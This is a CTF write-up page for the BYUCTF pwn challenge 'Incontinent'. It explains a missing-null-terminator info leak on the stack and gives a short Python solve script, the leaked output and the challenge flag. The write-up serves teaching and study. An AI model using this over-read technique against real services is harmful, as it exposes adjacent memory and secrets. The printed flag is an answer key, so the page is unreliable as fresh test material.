@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="Looks like a format-string bug, but printf uses a fixed %s. The real flaw: read() never null-terminates, so 32 bytes of padding bridge the gap to the flag buffer and %s over-reads straight into the secret.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="BYUCTF: Incontinent · 0xAdham">
+  <meta property="og:description" content="Looks like a format-string bug, but printf uses a fixed %s. The real flaw: read() never null-terminates, so 32 bytes of padding bridge the gap to the flag buffer and %s over-reads straight into the secret.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>BYUCTF: Incontinent · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> CTF</div>
+      <h1 class="page-title">BYUCTF: Incontinent</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-05-31</span>
+        <span>CTF</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p><strong>Platform:</strong> BYUCTF<br />
+<strong>Challenge:</strong> Incontinent<br />
+<strong>Category:</strong> Pwn<br />
+<strong>Difficulty:</strong> Easy</p>
+<h2>Flag</h2>
+<p><code>byuctf{incontinent_is_one_of_my_favorite_words_lol}</code></p>
+<h2>Target</h2>
+<p><code>&lt;remote-host&gt;:1366</code>. Local <code>incontinent_dist</code> prints a placeholder; real flag is in the same stack slot on the remote.</p>
+<ul>
+<li>ELF 64-bit, <strong>non-PIE</strong> (<code>EXEC</code>), NX on, dynamically linked, <strong>not stripped</strong>.</li>
+<li>Prompt: <em>"I've got the flag securely locked up, anything you want to say to it?"</em> Hint: <em>"make it a little more leaky"</em> + the name <strong>Incontinent</strong> → an info <strong>leak</strong>.</li>
+</ul>
+<h2>Recon</h2>
+<p><code>main</code> builds a local string on the stack (<code>movabs</code> immediates) at <code>[rbp-0x70]</code>:</p>
+<blockquote>
+<p>"the real flag will be here on remote. If you can see this, try what you just did on the remote server"</p>
+</blockquote>
+<p>Then:</p>
+<pre><code class="language-c">char input[];                 // [rbp-0x90]
+char flag_buf[] = &quot;...&quot;;      // [rbp-0x70]   (0x20 = 32 bytes above input)
+puts(&quot;I've got the flag...&quot;);
+read(0, input, 0x32);         // up to 50 bytes, NO null terminator
+printf(&quot;You said: &quot;);
+printf(&quot;%s&quot;, input);          // prints until the first NUL byte
+puts(&quot;Have a nice day&quot;);
+</code></pre>
+<p>rodata confirms the format strings: <code>"You said: "</code>, <code>"%s"</code>, <code>"\nHave a nice day"</code>.</p>
+<h2>The bug: not format string, missing NUL</h2>
+<p>The <code>printf</code> uses a <strong>fixed</strong> <code>"%s"</code> with <code>input</code> as the argument, so format specifiers in the input are <em>not</em> interpreted. The classic format-string bug doesn't apply. The real flaw: <strong><code>read</code> never null-terminates</strong>, and <code>printf("%s", input)</code> walks memory until it hits a <code>\0</code>.</p>
+<p>Stack layout (<code>rbp</code>-relative):</p>
+<pre><code>rbp-0x90  input        &lt;-- read() writes here (50 bytes max)
+rbp-0x70  flag_buf     &lt;-- exactly 0x20 (32) bytes above input
+</code></pre>
+<p>Send <strong>exactly 32 non-NUL bytes</strong>: <code>read</code> fills <code>[rbp-0x90, rbp-0x70)</code> with no terminator, so <code>%s</code> prints my 32 bytes and <strong>continues straight into <code>flag_buf</code></strong>, dumping the flag until its own NUL.</p>
+<ul>
+<li>Too few bytes → an uninitialized NUL in the gap stops <code>printf</code> early (short input leaks nothing).</li>
+<li>Too many (&gt;32, up to 50) → starts overwriting the flag's first bytes.</li>
+<li><strong>32 bridges the gap exactly.</strong> No newline (it's <code>read</code>, not <code>fgets</code>).</li>
+</ul>
+<h2>Solution</h2>
+<pre><code class="language-python">import socket, re
+s = socket.create_connection(('&lt;remote-host&gt;', 1366))
+s.recv(4096)
+s.sendall(b'A' * 32)                 # exactly 0x20 non-NUL bytes, no newline
+out = b''
+s.settimeout(4)
+try:
+    while True:
+        d = s.recv(4096)
+        if not d: break
+        out += d
+except socket.timeout: pass
+print(re.search(rb'byuctf\{[^}]*\}', out).group().decode())
+</code></pre>
+<p>Local test leaks the placeholder; remote leaks:</p>
+<pre><code>You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbyuctf{incontinent_is_one_of_my_favorite_words_lol}
+</code></pre>
+<h2>Takeaways</h2>
+<ul>
+<li><code>read(fd, buf, n)</code> does <strong>not</strong> null-terminate, so any later <code>%s</code>/<code>strlen</code>/<code>strcpy</code> on that buffer over-reads into adjacent memory. Pad to the exact distance of the secret to bridge the gap deterministically.</li>
+<li>"format string" instinct can be a bait: check whether user input is the <em>format</em> (<code>printf(buf)</code>) or just an <em>argument</em> (<code>printf("%s", buf)</code>). Here it was the latter, and the bug was termination, not specifiers.</li>
+<li>Compute the leak distance straight from the frame: <code>input @ rbp-0x90</code>, <code>flag @ rbp-0x70</code> → 32 bytes.</li>
+<li>The name is the spec: <em>incontinent</em> = can't hold it in = it leaks.</li>
+</ul>
+<p><em>0xAdham</em></p>
+        </article>
+        <aside class="article-aside">
+          <div class="eyebrow"><span class="index">FIELD NOTE</span> Details</div>
+          <h2>Clear. Scoped. Reproducible.</h2>
+          <p>Looks like a format-string bug, but printf uses a fixed %s. The real flaw: read() never null-terminates, so 32 bytes of padding bridge the gap to the flag buffer and %s over-reads straight into the secret.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-05-31</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            <div style="margin-top:10px"><strong style="color:var(--ink)">Tags:</strong><div style="margin-top:5px"><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">ctf</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">pwn</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">info-leak</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">missing-null-terminator</span><span class="tag" style="display:inline-block;margin:2px 4px 2px 0;padding:2px 7px;background:var(--panel-2);border:1px solid var(--line);border-radius:2px;font-size:11px">byuctf</span></div></div>
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
